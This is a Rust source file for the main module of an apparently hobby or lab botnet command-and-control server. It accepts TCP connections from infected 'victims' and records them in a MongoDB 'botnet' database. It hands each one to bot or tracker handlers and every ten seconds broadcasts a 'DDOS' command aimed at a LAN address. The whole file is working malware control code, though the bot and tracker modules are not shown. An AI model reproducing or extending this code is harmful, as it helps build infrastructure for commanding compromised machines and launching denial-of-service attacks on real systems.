#[macro_use]
extern crate log;

use std::{env, net::SocketAddr, thread};
use std::net::{TcpListener, TcpStream};
use std::time::Duration;

use mongodb::bson::doc;
use mongodb::options::ClientOptions;
use mongodb::sync::{Client, Collection};

use crossbeam_channel::Receiver;

use victim::{Victim, VictimDb, VictimType};

mod tracker;
mod victim;
mod bot;

fn main() {

    // Initiate logging
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "debug");
    }
    env_logger::init();

    // Bind port
    let listener = TcpListener::bind("192.168.1.29:9570").unwrap();

    // Connect to the database
    let options = ClientOptions::parse("mongodb://127.0.0.1:27017/").unwrap();
    let db_client = Client::with_options(options).unwrap();

    // Channel to send a message to all trackers
    let (tx, rx) = crossbeam_channel::bounded(5);

    info!("Server started");

    thread::spawn(move || {
        loop {
            thread::sleep(Duration::from_secs(10));
            debug!("Sending test message to trackers");
            tx.send("DDOS 192.168.1.29\r\n").expect("huh");
        }
    });

    loop {
        let (mut stream, addr) = listener.accept().unwrap();

        info!("Connection established");
        let client = db_client.clone();
        let rx2 = rx.clone();
        thread::spawn(move || {
            let victims_collection = client.database("botnet").collection::<VictimDb>("victims");
            let victim = victim::check_connection(&mut stream, &addr);
            if let Some(mut victim) = victim {
                insert_victim_db(&victim, &addr, &victims_collection);
                manage_victim(&mut victim, &mut stream, &victims_collection, rx2);
                info!("The victim: {} disconnected", &victim.ip.ip());
            } else {
                info!("{} tried to establish a connection but failed the test", addr.ip().to_string());
            }
         });
    }
}

/// Connects a victim to the server and let it know what type it is
fn manage_victim(victim: &mut Victim, stream: &mut TcpStream, victims_collection: &Collection<VictimDb>, receiver: Receiver<&str>) {
    match victim.victim_type {
        VictimType::Bot => {
            if let Err(err) = bot::manage_bot(&victim, stream, victims_collection) {
                error!("Error while communicating with the bot: {}", err);
            }
        },
        VictimType::Tracker => {
            if let Err(err) = tracker::manage_tracker(&victim, stream, receiver) {
                error!("Error while communicating with the tracker: {}", err);
            }
        }
    }
    victim.update_status(victims_collection, false).ok();
}

/// Inserts a victim into the database, if the victim is already known update its status to active
fn insert_victim_db(victim: &Victim, addr: &SocketAddr, victims_collection: &Collection<VictimDb>) {
    let filter = doc! { "ip": addr.ip().to_string() };
    let find_victim = victims_collection.find_one(filter, None);

    if let Err(err) = find_victim {
        error!("Error while trying to find a victim on the collection: {}", err);
        return;
    }
    let find_victim = find_victim.unwrap();
    if find_victim.is_none() {
        if let Err(err) = victims_collection.insert_one(VictimDb { ip: addr.ip().to_string(), victim_type: victim.victim_type, active: false }, None) {
            error!("Failed to insert in the database : {}", err);
        } else {
            info!("A new victim has been inserted in the database, ip: {}, mode: {}", addr.ip().to_string(), victim.victim_type);
        }
    } else {
        info!("An old victim connected to the server, ip: {} mode: {}", addr.ip().to_string(), victim.victim_type);
    }
    if let Err(err) = victim.update_status(&victims_collection, true) {
        error!("Failed to update victim's active status to true: {}", err);
    }
}

